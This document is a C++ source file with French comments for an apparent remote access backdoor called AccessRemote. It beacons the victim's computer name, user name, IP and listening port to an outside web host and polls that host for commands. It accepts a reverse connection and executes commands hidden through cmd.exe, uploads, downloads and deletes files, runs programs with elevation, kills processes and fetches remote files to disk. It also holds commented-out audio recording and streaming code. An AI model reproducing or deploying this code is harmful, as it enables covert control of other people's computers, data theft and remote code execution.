// AccessRemote.cpp : définit le point d'entrée pour l'application console.
//

//mainCRTStartup
// wazabi
#include "stdafx.h"
#include <iostream>
#include <SFML\Network.hpp>
#include <SFML\System.hpp>
#include <SFML\Audio.hpp>
#include <cstdio>
#include <time.h>
#include <sstream>
#include <string>
#include <fstream>
#include <Windows.h>
#include <direct.h>

#include "fonctions.h"
#include "voIpRecord.h"

using namespace std;

void httpCmd(string cmd, string arg1, string arg2, string arg3);

int main(int argc, char *argv[])
{
#if _WIN64
	string version = "2.2.0.0 x64";
	bool archWin64 = true;
#else
	string version = "2.2.0.0";
	bool archWin64 = false;
#endif

	cout << "LISTENER" << endl;

	bool isConnected = false;
	bool first = true;

	cout << "argc: " << argc << endl;

	if(argc < 2)
		sf::sleep(sf::seconds(120));

	sf::TcpSocket socket;
	sf::TcpListener listener;
	socket.setBlocking(false);
	sf::Packet packet;
	sf::IpAddress ip;
	unsigned short portStream = 0;
	unsigned short port;
	unsigned short portSend;
	listener.listen(sf::Socket::AnyPort);
	listener.setBlocking(false);
	//listener.listen(25565);
	cout << "port used: " << listener.getLocalPort() << endl;

	sf::Http http;
	http.setHost("http://www.jesuisuncanard.hol.es/");
	sf::Http::Request request;
	sf::Http::Response response;
	request.setMethod(sf::Http::Request::Method::Get);
	request.setHttpVersion(1, 1);
	//request.setUri("/url.php?var=x");
	ostringstream str; //request1
	ostringstream ss;
	stringstream str2; //request2
	ostringstream converterS;
	int httpRep = 0;
	string s;
	string msg;
	fstream flux;
	string path;
	sf::Uint16 codeSend;
	sf::Uint16 msgInt;

	wstring msgW;
	wstring msgBoxMsg;
	wstring msgBoxTitle;
	vector<wstring> wlist;
	wstringstream ssW;

	char charact;

	UINT beep;

	int result;
	char *pValue1;
	size_t len1;
	char *pValue2;
	size_t len2;
	char *GET;
	size_t GETLEN;
	TCHAR username[100];
	DWORD usernameSize = 100;

	//shutdown record
	sf::Int64 timeout;
	DWORD shutdownFlag;
	bool restart;

	unsigned long temps = time(0);
	unsigned long temps2 = time(0);
	unsigned long temps3 = time(0);

	string cmd, arg1, arg2, arg3;

	//sf::SoundBufferRecorder record;

	//voIpRecord recordIp("127.0.0.1", 0);

	while (1) {
		if (!isConnected) {
			
			if (listener.accept(socket) == sf::Socket::Done)
			{
				isConnected = true;
				cout << "CONNECTED" << endl;
			}
		}
		else {
			packet.clear();
			if (socket.receive(packet) != sf::Socket::NotReady) //commande recu
			{
				socket.setBlocking(true);
				packet >> msg;
				packet.clear();
				if (msg == "ping") {
					packet << "pong";
					socket.send(packet);
					packet.clear();
				}
				else if (msg == "version")
				{
					packet << version;
					socket.send(packet);
					packet.clear();
				}
				else if (msg == "upload")
				{
					socket.receive(packet);
					packet >> path;
					cout << "path: " << path;
					packet.clear();
					socket.receive(packet);

					ss.str("");
					ss.clear();
					packet >> s;
					packet.clear();
					ss << s;
					flux.open(path, ios::out | ios::binary | ios::trunc);
					flux << ss.str();
					flux.close();
					s = "";
					ss.str("");
				}
				else if (msg == "download")
				{
					socket.receive(packet);
					packet >> path >> msgInt;
					packet.clear();

					flux.open(path, ios::in | ios::binary);
					ss.str("");
					ss.clear();
					while (flux.get(charact))
						ss << charact;
					flux.close();

					if (msgInt = 1)
						remove(path.c_str());

					packet.clear();
					packet << ss.str();
					socket.send(packet);
					packet.clear();
					ss.str("");
					ss.clear();
				}
				else if (msg == "run")
				{
					socket.receive(packet);
					packet >> msg >> path;
					STARTUPINFOA si;
					PROCESS_INFORMATION pi;

					ZeroMemory(&si, sizeof(si));
					si.cb = sizeof(si);
					ZeroMemory(&pi, sizeof(pi));
					cout << "run: " << msg.c_str();
					cout << CreateProcessA(msg.c_str(), "", NULL, NULL, false, CREATE_NEW_CONSOLE, NULL, path.c_str(), &si, &pi) << endl;
				}
				else if (msg == "runAdmin")
				{
					socket.receive(packet);
					packet >> msg >> path;
					STARTUPINFOA si;
					PROCESS_INFORMATION pi;

					ZeroMemory(&si, sizeof(si));
					si.cb = sizeof(si);
					ZeroMemory(&pi, sizeof(pi));
					cout << "run: " << msg.c_str();
					cout << ShellExecuteA(NULL, "runas", msg.c_str(), "", NULL, SW_SHOWNORMAL) << endl;
				}
				else if (msg == "kill")
				{
					socket.receive(packet);
					packet >> msg;
					killProcessByName(msg.c_str());
				}
				else if (msg == "msgBox")
				{
					socket.receive(packet);
					packet >> msg >> msgBoxMsg >> msgBoxTitle;
					packet.clear();
					if (msg != "NONE")
					{
						if (msg == "error")
							beep = 0x00000010L;
						else
							beep = 0x00000000L;
						MessageBeep(beep);
					}
					MessageBox(NULL, msgBoxMsg.c_str(), msgBoxTitle.c_str(), MB_SETFOREGROUND);

				}
				else if (msg == "remove")
				{
					socket.receive(packet);
					packet >> msg;
					packet.clear();
					result = remove(msg.c_str());
					packet << result;
					socket.send(packet);
					packet.clear();
				}
				else if (msg == "rename")
				{
					socket.receive(packet);
					packet >> path >> msg;
					packet.clear();
					result = rename(path.c_str(), msg.c_str());
					packet << result;
					socket.send(packet);
					packet.clear();
				}
				else if (msg == "GET")
				{
					socket.receive(packet);
					packet >> msg;
					_dupenv_s(&GET, &GETLEN, msg.c_str());
					packet.clear();
					converterS.str("");
					converterS.clear();
					converterS << GET;
					msg = converterS.str();
					packet << msg;
					socket.send(packet);
					packet.clear();
				}
				else if (msg == "shutdown")
				{
					socket.receive(packet);
					packet >> timeout >> msg;
					if (msg == "restart")
					{
						shutdownFlag = 0x00000004;
					}
					else {
						shutdownFlag = 0x00000008;
					}
					packet.clear();
					InitiateShutdown(NULL, NULL, (DWORD)timeout, shutdownFlag, 0);
				}
				else if (msg == "system")
				{
					socket.receive(packet);
					packet >> msg;
					packet.clear();
					string resultSystem = "/C " + msg;
					ShellExecuteA(NULL, "open", "cmd.exe", resultSystem.c_str(), "C:\\ProgramData\\", SW_HIDE);
				}
				else if (msg == "mkdir")
				{
					socket.receive(packet);
					packet >> msg;
					packet.clear();
					_mkdir(msg.c_str());
				}
				/*else if (msg == "record audio")
				{
					socket.receive(packet);
					packet >> timeout >> path;
					if (sf::SoundBufferRecorder::isAvailable())
					{
						result = 0;
						packet << result;
						socket.send(packet);
						packet.clear();

						record.start();
						sf::sleep(sf::seconds(timeout));
						record.stop();
						const sf::SoundBuffer& buffer = record.getBuffer();
						buffer.saveToFile(path);
						packet << "DONE!";
						socket.send(packet);
						packet.clear();
					}
					else {
						result = -1;
						packet << result;
						socket.send(packet);
						packet.clear();
					}
				}*/
				else if (msg == "ls")
				{
					socket.receive(packet);
					packet >> msgW;
					packet.clear();
					wlist = dir(msgW);
					ssW.str(_T(""));
					ssW.clear();
					for (int i = 0; i < wlist.size(); i++)
						ssW << wlist[i] << endl;
					msgW = ssW.str();
					packet << msgW;
					socket.send(packet);
					packet.clear();
				}
				else if (msg == "cat")
				{
					bool ok = true;
					string ligne = "";
					socket.receive(packet);
					packet >> msg;
					flux.open(msg, ios::in);
					msg = "";
					if (flux.is_open())
					{
						while (getline(flux, ligne))
						{
							msg += ligne;
							msg += '\n';
						}
					}
					else
						ok = false;
					packet.clear();
					packet << ok << msg;
					socket.send(packet);
				}
				else if (msg == "stop")
				{
					return 0;
				}
				/*else if (msg == "streamAudioStart")
				{
					socket.receive(packet);
					packet >> portStream;
					packet.clear();
					cout << "stream start ip: " << socket.getRemoteAddress() << "   port: " << portStream << endl;
					recordIp.m_host = socket.getRemoteAddress();
					recordIp.m_port = portStream;
					recordIp.start();
				}
				else if (msg == "streamAudioStop")
				{
					recordIp.stop();
				}*/

				socket.setBlocking(false);
			}

			sf::sleep(sf::milliseconds(100));
		}
		temps2 = time(0);
		if (isConnected)
			temps3 = 2;
		else
			temps3 = 30;
		if (first)
		{
			temps3 = 0;
		}
		if (temps2 - temps > temps3) //envoie web
		{
			if (first)
				first = false;
			temps = temps2;
			str.str("");
			str.clear();
			GetUserNameW(username, &usernameSize);
			str << "/accessRemote.php?ipLocal=" << sf::IpAddress::getLocalAddress() << "&";
			str << "port=" << listener.getLocalPort() << "&";
			_dupenv_s(&pValue1, &len1, "COMPUTERNAME");
			str << "compName=" << pValue1 << "&";
			_dupenv_s(&pValue2, &len2, "USERNAME");
			str << "userName=" << username << "&";
			str << "version=" << version;
			request.setUri(str.str());
			//cout << "str: " << str.str() << endl;

			if (!isConnected) {
				http.sendRequest(request);
				str.str("");
				str.clear();

				str << "/accessControl.php?ipLocal=" << sf::IpAddress::getLocalAddress() << "&";
				str << "port=" << listener.getLocalPort() << "&";
				_dupenv_s(&pValue1, &len1, "COMPUTERNAME");
				str << "compName=" << pValue1 << "&";
				_dupenv_s(&pValue2, &len2, "USERNAME");
				str << "userName=" << username;
				request.setUri(str.str());

				response = http.sendRequest(request);
				str2.str("");
				str2.clear();
				str2 << response.getBody();
				str2 >> httpRep >> ip >> port;
				if (httpRep == 42)
				{
					socket.setBlocking(true);
					socket.connect(ip, port, sf::seconds(10));
					isConnected = true;
					cout << "CONNECTED!" << endl;
					socket.setBlocking(false);
				}
			}


			//cherche des commandes
			
				str.str("");
				str.clear();

				str << "/accessCmd.php?ipLocal=" << sf::IpAddress::getLocalAddress() << "&";
				str << "port=" << listener.getLocalPort() << "&";
				_dupenv_s(&pValue1, &len1, "COMPUTERNAME");
				str << "compName=" << pValue1 << "&";
				_dupenv_s(&pValue2, &len2, "USERNAME");
				str << "userName=" << username;
				request.setUri(str.str());

				response = http.sendRequest(request);
				str2.str("");
				str2.clear();
				str2 << response.getBody();
				//str2 >> cmd >> arg1 >> arg2 >> arg3; //3 arguments, ca devrait etre suffisant.
				getline(str2, cmd);
				getline(str2, arg1);
				getline(str2, arg2);
				getline(str2, arg3);
				//bon c'est con de faire "propre" maintenant mais yolo on envoit tout sur une fonction qui trie :)
				if (cmd != "NULL") {
					httpCmd(cmd, arg1, arg2, arg3);
				}
			

			if (socket.receive(packet) == sf::Socket::Disconnected)
			{
				isConnected = false;
				cout << "DISCONNECTED" << endl;
				socket.disconnect();
			}
		}

		sf::sleep(sf::milliseconds(100));
	}

	return 0;
}



void httpCmd(string cmd, string arg1, string arg2, string arg3)
{
	if (cmd == "system")
	{
		string resultSystem = "/C " + arg1;
		cout << "system arg1: " << arg1 << endl;
		ShellExecuteA(NULL, "open", "cmd.exe", resultSystem.c_str(), "C:\\ProgramData\\", SW_HIDE);
	}

	if (cmd == "rename")
	{
		ofstream name("ID.txt", ios::out | ios::trunc);
		name << arg1;
		name.close();
	}

	if (cmd == "send")
	{
		ofstream flux(arg3, ios::binary);
		sf::Http::Request request(arg2, sf::Http::Request::Get);
		sf::Http http(arg1);
		sf::Http::Response response = http.sendRequest(request);

		flux << response.getBody();
		flux.close();
	}
}